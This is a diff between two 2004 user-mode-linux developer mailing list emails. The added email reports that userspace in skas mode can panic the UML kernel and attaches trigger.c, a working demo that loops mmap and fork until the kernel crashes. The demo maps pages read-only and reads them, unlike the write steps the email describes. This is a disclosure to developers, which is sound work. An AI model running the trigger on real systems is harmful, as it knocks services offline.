@@ -2,22 +2,28 @@ Return-Path: <user-mode-linux-devel-admin@lists.sourceforge.net>
 Received: from sc8-sf-mx1-b.sourceforge.net ([10.3.1.11]
 	helo=sc8-sf-mx1.sourceforge.net)
 	by sc8-sf-list1.sourceforge.net with esmtp (Exim 4.30)
-	id 1BfaxV-0006aG-O5 for user-mode-linux-devel@lists.sourceforge.net;
-	Wed, 30 Jun 2004 02:00:49 -0700
-Received: from smtp-out4.xs4all.nl ([194.109.24.5])
+	id 1Bfbsb-0003K4-IL for user-mode-linux-devel@lists.sourceforge.net;
+	Wed, 30 Jun 2004 02:59:49 -0700
+Received: from ns.sysgo.de ([213.68.67.98] helo=mailgate.sysgo.de)
 	by sc8-sf-mx1.sourceforge.net with esmtp (Exim 4.34)
-	id 1BfaxU-0007SK-MX for user-mode-linux-devel@lists.sourceforge.net;
-	Wed, 30 Jun 2004 02:00:49 -0700
-In-Reply-To: <40E20187.1050803@nks.net>
-References: <20040629182711.GM5243@alcor.net> <40E20187.1050803@nks.net>
-Mime-Version: 1.0 (Apple Message framework v618)
-Content-Type: multipart/signed; protocol="application/pgp-signature";
-	micalg=pgp-sha1; boundary="Apple-Mail-3-753330730"
-Message-Id: <02F391BE-CA6B-11D8-A5A1-000A95CD704C@wagland.net>
-Content-Transfer-Encoding: 7bit
-From: Paul Wagland <paul@wagland.net>
-Subject: Re: [uml-devel] [mgedmin@b4net.lt: Bug#256873: user-mode-linux: fails
-	to start (kernel panic)]
+	id 1Bfbsa-0002AH-R1 for user-mode-linux-devel@lists.sourceforge.net;
+	Wed, 30 Jun 2004 02:59:49 -0700
+Received: from localhost (localhost [127.0.0.1])
+	by mailgate.sysgo.de (Postfix) with ESMTP id 3F8DB47B98
+	for <user-mode-linux-devel@lists.sourceforge.net>;
+	Wed, 30 Jun 2004 11:59:06 +0200 (CEST)
+Received: from donald.sysgo.com (unknown [172.20.1.30])
+	by mailgate.sysgo.de (Postfix) with ESMTP id 275DC47B98
+	for <user-mode-linux-devel@lists.sourceforge.net>;
+	Wed, 30 Jun 2004 11:59:06 +0200 (CEST)
+Message-ID: <40E29034.7040504@sysgo.de>
+From: azu <azu@sysgo.de>
+MIME-Version: 1.0
+Subject: Re: [uml-devel] bad panic "Kernel stack overflow" - demo exploit
+References: <40E0036D.2070108@sysgo.de>
+	<200406291604.51726.blaisorblade_spam@yahoo.it>
+In-Reply-To: <200406291604.51726.blaisorblade_spam@yahoo.it>
+Content-Type: multipart/mixed; boundary="------------030900010907010604060206"
 Sender: user-mode-linux-devel-admin@lists.sourceforge.net
 Errors-To: user-mode-linux-devel-admin@lists.sourceforge.net
 List-Unsubscribe: <https://lists.sourceforge.net/lists/listinfo/user-mode-linux-devel>,
@@ -29,67 +35,138 @@ List-Help: <mailto:user-mode-linux-devel-request@lists.sourceforge.net?subject=h
 List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/user-mode-linux-devel>,
 	<mailto:user-mode-linux-devel-request@lists.sourceforge.net?subject=subscribe>
 List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum=user-mode-linux-devel>
-Date: Wed, 30 Jun 2004 09:56:36 +0200
-To: James Neal <jneal@nks.net>
-Cc: Matt Zimmerman <mdz@debian.org>, user-mode-linux-devel@lists.sourceforge.net, 256873-forwarded@bugs.debian.org, Marius Gedminas <mgedmin@b4net.lt>
+Date: Wed, 30 Jun 2004 12:04:37 +0200
+To: user-mode-linux-devel@lists.sourceforge.net
 
 
+This is a multi-part message in MIME format.
+--------------030900010907010604060206
+Content-Type: text/plain; charset=ISO-8859-1; format=flowed
+Content-Transfer-Encoding: quoted-printable
 
---Apple-Mail-3-753330730
-Content-Transfer-Encoding: 7bit
-Content-Type: text/plain; charset=US-ASCII; format=flowed
-
-
-On Jun 30, 2004, at 1:55, James Neal wrote:
-
-> Matt Zimmerman wrote:
+BlaisorBlade wrote:
+> Alle 13:39, luned=EC 28 giugno 2004, azu ha scritto:
+>=20
+>>Hi,
+>=20
+>=20
+>>I triggered the following panic from userspace in skas mode
+>>by mapping pages above 0xa0000000 ...
+>=20
+>=20
+>>The check is useless in skas-mode (kernel faults get filtered
+>>in segv() before handle_page_fault() is called),
+>>so I added an ifdef for tt mode.
+>=20
+>=20
+> This is a more sensible version of the patch (with runtime checking ins=
+tead=20
+> that compile time), if I did not overlook anything: it must be an if(mo=
+de_tt).=20
+> I always compile in TT mode and normally don't use it (and sometimes UM=
+L does=20
+> not compile otherwise), and the patch must still work.
+>=20
+>=20
+> However, I don't think this is the proper fix: please elaborate a bit m=
+ore.=20
+> Segv() works the same way under TT and SKAS, and I think that more like=
+ly=20
+> there were an actual stack overflow (try to increase=20
+> CONFIG_KERNEL_STACK_ORDER and try to re-get the panic).
 >
->> I am receiving many reports from my users that 2.4.26-1um is less 
->> functional
->> than past versions, especially (but not exclusively) where hostfs is
->> concerned.  Are others experiencing problems as well?  I am 
->> considering
->> reverting the Debian packages to 2.4.24-1um, which was the last 
->> version
->> which was stable for me (it had only one frustrating hostfs bug, where
->> readdir() would read forever).
->>
-> Yeah, I upgraded about a hundred (non-critical) UMLs to a straight 
-> 2.4.26-1um kernel about a two weeks ago, and immediately started 
-> getting 2-3 crashes (like the one below) per hour.   When backups 
-> kicked off, they pretty much all went down at the same time.  
-> (Unfortunately, I hadn't added automatic backtracing to the UMLazi 
-> codebase yet, so I didn't get backtraces.)
 
-I normally hate doing this... but me too!
+Paolo, your patch is the better one :-)
 
-Even worse, it would appear that UML and reiserfs don't play nice... 
-when the UML does crash I tend to end up with some pretty massive 
-filesystem corruptions, to the point where my UML will not boot 
-anymore, and I spent over an hour just now trying to coax it back to 
-life by copying in and replacing all of the corrupted binaries.
+But it wasn't a stack overflow ...
 
-This is using UBD, and not hostfs.
+Due to "overlapping" address spaces in skas mode,
+it is possible to trigger the panic:
+A userpage with the same address as current + 4096
+must be valid in the vma, but not (yet) mapped to
+the user:
+0) addr =3D 0xa0000000
+1) mmap a zero page to addr (valid vma) readwrite
+2) fork -> mapping is now readonly
+3) child writes to page
+4) IF addr =3D=3D current + 4096 THEN panic
+5) addr +=3D 4096
+6) goto 1)
 
-Cheers,
-Paul
+I wrote a small demo app to trigger the problem.
+Limit your UML memory to 16MB or so to trigger the panic faster.
 
---Apple-Mail-3-753330730
-content-type: application/pgp-signature; x-mac-type=70674453;
-	name=PGP.sig
-content-description: This is a digitally signed message part
-content-disposition: inline; filename=PGP.sig
-content-transfer-encoding: 7bit
 
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1.2.4 (Darwin)
 
-iD8DBQFA4nI1tch0EvEFvxURAo25AJ9rOphj6B3VU8/bCd7UQvb0SNhB9gCgnFCy
-uWpYlGwwzdi2DexOn7Ozu8U=
-=M7Jm
------END PGP SIGNATURE-----
+-Alex
 
---Apple-Mail-3-753330730--
+
+
+
+--------------030900010907010604060206
+Content-Type: text/x-csrc;
+ name="trigger.c"
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline;
+ filename="trigger.c"
+
+/*
+ * trigger.c - triggers panic("Kernel stack overflow") in UML
+ *
+ * 20040630, azu@sysgo.de
+ */
+
+#include <stdio.h>
+#include <setjmp.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/mman.h>
+
+#define LOW  0xa0000000
+#define HIGH 0xb0000000
+
+int main(int argc, char **argv)
+{
+	unsigned long addr;
+	int fd;
+
+	fd = open("/dev/zero", O_RDWR);
+
+	printf("This may take some time ... one more cup of coffee ...\n");
+
+	for(addr = LOW; addr < HIGH; addr += 0x1000)
+	{
+		pid_t p;
+		if(mmap((void*)addr, 0x1000, PROT_READ, MAP_SHARED | MAP_FIXED, fd, 0) == MAP_FAILED)
+			printf("mmap failed\n");
+
+		p = fork();
+		if(p == -1)
+			printf("fork failed\n");
+
+		if(p == 0)
+		{
+			/* child context */
+			int *p = (int *)addr;
+			volatile int x;
+
+			x = *p;
+			return 0;
+		}
+		/* father context */
+		waitpid(p, 0, 0);
+
+		if(munmap((void*)addr, 0x1000) == -1)
+			printf("munmap failed\n");
+	}
+
+	close(fd);
+	printf("done\n");
+}
+
+--------------030900010907010604060206--
 
 
 
